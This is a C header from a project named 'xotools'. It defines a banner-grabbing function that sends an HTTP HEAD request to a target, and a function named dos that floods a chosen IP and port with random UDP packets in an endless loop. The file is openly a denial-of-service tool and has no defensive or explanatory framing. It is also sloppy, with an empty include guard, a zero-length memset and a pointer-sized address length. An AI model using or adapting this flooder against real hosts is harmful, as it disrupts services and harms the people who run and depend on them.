//
//  networking.h
//  xotools
//
//  Created by Yosif Aboulaban on 17.05.2024.
//

#ifndef networking_h
#define networking_h


#endif /* networking_h */

#include <netdb.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <netdb.h>

#define SUBIMAGES (1000)
#define FRAMES_PER_SUBIMAGES (23)
#define UDP_FRAME (1442)

#define BUFFER_SIZE (SUBIMAGES * FRAMES_PER_SUBIMAGES * UDP_FRAME)

unsigned char buffer[BUFFER_SIZE];

void build(uint8_t* buffer, size_t length)
{
    for (size_t i = 0; i < length; i++)
    {
        buffer[i] = (rand() % 255) + 1;
    }
}


void id_scan(const char ip[], int port)
{
    struct sockaddr_in target_addr;
    struct hostent *host_info;
    int sockfd;
    char buffer[4096];
    
    sockfd = socket(PF_INET, SOCK_STREAM, 0);
    host_info = gethostbyname(ip);
    printf("created socket\n");
    
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr = *((struct in_addr *)host_info -> h_addr);
    memset(&(target_addr.sin_zero), '\0', 8);
    printf("specified the address");
    
    if(connect(sockfd, (struct sockaddr*)&target_addr, sizeof(struct sockaddr)) < 0)
    {
        printf("FATAL error: problem connecting to your target");
    }
    send(sockfd, "HEAD / HTTP/1.0\r\n\r\n", sizeof("HEAD / HTTP/1.0\r\n\r\n"), 0);
    
    while(1)
    {
        recv(sockfd, buffer, sizeof(buffer), 0);
        printf("the id for %s is %s\n", ip, buffer+8);
        break;
    }
}

void dos(const char ip[], int port)
{
    struct sockaddr_in target_addr;
    int sockfd;
    
    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
    
    build(buffer, sizeof(buffer));
    
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(ip);
    memset(&(target_addr.sin_zero), '\0', 0);
    
    connect(sockfd, (struct sockaddr*)&target_addr, sizeof(struct sockaddr *));
    
    
    while(1)
    {
        printf("sending\n");
        sendto(sockfd, &buffer, UDP_FRAME, 0, (const struct sockaddr *)&target_addr, sizeof(target_addr));
        
        printf("sent\n");
    }
}

